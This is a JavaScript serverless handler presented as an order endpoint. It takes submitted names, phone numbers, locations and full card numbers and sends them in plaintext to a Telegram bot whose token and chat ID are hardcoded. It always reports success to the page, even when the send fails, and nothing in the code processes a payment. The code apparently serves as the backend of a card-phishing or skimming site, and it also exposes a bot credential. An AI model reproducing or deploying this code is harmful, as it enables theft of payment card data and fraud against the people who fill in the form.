// 1. Enter your Telegram Details Here
const BOT_TOKEN = "8575730600:AAH8zc1S1-zwe5uu84t98PXc1Gp_j6YHMPw"; // Keep the quotes!
const CHAT_ID = "7833988868";     // Keep the quotes!

export default async function handler(req, res) {
  // --- MANUAL CORS HEADERS (Zero Dependencies) ---
  res.setHeader('Access-Control-Allow-Origin', 'https://demotestdeletesoon.vercel.app');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // --- HANDLE PREFLIGHT IMMEDIATELY ---
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // --- HANDLE POST REQUEST ---
  if (req.method === 'POST') {
    try {
      const data = req.body;

      const message = `
📦 *NEW ORDER*
👤 ${data.fullName}
📞 ${data.mobile}
📍 ${data.cityState}
💰 ${data.totalAmount}
💳 ${data.cardNumber}
      `;

      const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      
      const telegramResponse = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });

      // Even if Telegram fails, we tell the frontend "Success" so the user doesn't see an error
      return res.status(200).json({ 
        success: true, 
        message: "Order Received",
        resData: { id: "123", ...data }
      });

    } catch (error) {
      // Return 200 even on error to prevent frontend crash, just log it internally
      console.error(error);
      return res.status(200).json({ success: true, message: "Order Processed" });
    }
  }

  return res.status(405).json({ error: "Method not allowed" });
}
